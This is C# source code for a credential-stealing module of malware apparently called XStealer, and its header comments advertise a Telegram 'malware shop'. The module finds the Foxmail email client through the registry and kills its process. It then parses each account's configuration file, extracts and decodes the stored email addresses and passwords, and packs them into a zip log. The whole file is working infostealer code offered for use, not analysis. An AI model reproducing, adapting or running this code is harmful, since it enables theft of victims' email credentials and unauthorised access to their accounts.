// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps
{
    using System;
    using System.IO;
    using System.Text;
    using System.Threading.Tasks;
    using Helpers;
    using Microsoft.Win32;

    public static class FoxMail
    {
        public static void Inizialize()
        {
            // Поток для хранения данных в памяти
            using var ms = new MemoryStream { Position = 0 };
            // Проверяем директорию 
            if (Directory.Exists(Location))
            {
                // Вырубаем процесс для чтения данных
                using var FoxProcessFunction = Task.Run(() => ProcessEx.Closing("Foxmail"));
                FoxProcessFunction.Wait(); // Ожидаем окончания завершения процесса
                try
                {
                    // Поток для записи даннных в файл
                    using var data = new StreamWriter(ms, Encoding.UTF8);
                    // Перебираем все папки 
                    foreach (string dir in Directory.GetDirectories(Location, "*@*", SearchOption.TopDirectoryOnly))
                    {
                        string Email = dir.Substring(dir.LastIndexOf("\\") + 1); // Имя папки это наш Email адресс
                        string UserDat = GlobalPaths.CombinePath(dir, @"Accounts\Account.rec0"); // Файл конфига где хранятся данные
                        using var fs = new FileStream(UserDat, FileMode.Open); // Открываем файл для чтения

                        // Читаем размер файла
                        int len = (int)fs?.Length, ver = 0;
                        var bits = new byte[len]; // Выделяем буфер под размер
                        bool accfound = false;
                        string buffer = "";

                        fs.Read(bits, 0, len); // Читаем байты
                        ver = bits[0] == 0xD0 ? 0 : 1; // Проверка, что файл версии 6.X : 7.0 и 7.1

                        // Цикл для фильтрации не буквенно-цифровых символов. Сформировать слово из отдельного символа
                        for (int jx = 0; jx < len; ++jx)
                        {
                            if (bits[jx] > 0x20 && bits[jx] < 0x7f && bits[jx] != 0x3d) // Отфильтровать не буквенно-цифровые символы
                            {
                                buffer += (char)bits[jx]; // Строка из слова
                                string acc = "";  // Проверим, идет ли следующее слово в учетную запись пользователя
                                if (buffer.Equals("Account") || buffer.Equals("POP3Account"))
                                {
                                    int index = jx + 9; // Оффсет
                                    if (ver == 0) { index = jx + 2; } // Для версии 6.5 требуется дополнительное смещение
                                    // Цикл до тех пор, пока не будут извлечены все данные
                                    // Данные представлены буквенно-цифровыми символами, среднее значение конца данных не буквенно-цифровое
                                    while (bits[index] > 0x20 && bits[index] < 0x7f) { acc += (char)bits[index]; index++; }
                                    accfound = true; // Флаг для указания, что аккаунт найден
                                    jx = index; // Сдвинуть текущий "указатель" на конечный индекс данных
                                }
                                // Если есть учетная запись пользователя, проверить её пароль
                                else if (accfound && (buffer.Equals("Password") || buffer.Equals("POP3Password")))
                                {
                                    int index = jx + 9;
                                    if (ver == 0) { index = jx + 2; }
                                    string pw = "";
                                    while (bits[index] > 0x20 && bits[index] < 0x7f) { pw += (char)bits[index]; index++; }
                                    data.WriteLine($"E-Mail: {Email}");
                                    data.WriteLine($"Password: {DecoderEx.DecodeFoxMail(ver, pw)}");

                                    jx = index; break;
                                }
                            }
                            else { buffer = ""; }
                        }
                    }
                }
                catch { }
            }
            ZipEx.AddKeyPairStream("FoxMail_Log.txt", ms?.ToArray() ?? ms.GetBuffer() ?? null);
        }

        private static string Location
        {
            get
            {
                string result = "";
                const string FOXPATH = @"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command";
                try
                {
                    RegistryHive registryHive = Privilegies.IsAdmin ? RegistryHive.LocalMachine : RegistryHive.CurrentUser;
                    RegistryView registryView = Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32;
                    using var Fox = RegistryKey.OpenBaseKey(registryHive, registryView);
                    using RegistryKey Key = Fox.OpenSubKey(FOXPATH, Environment.Is64BitOperatingSystem);
                    if (Key != null)
                    {
                        string set = Key.GetValue("").ToString();
                        result = string.Concat(set.Remove(set.LastIndexOf("Foxmail.exe")).Replace("\"", ""), @"Storage\");
                    }
                }
                catch { }
                return result;
            }
        }
    }
}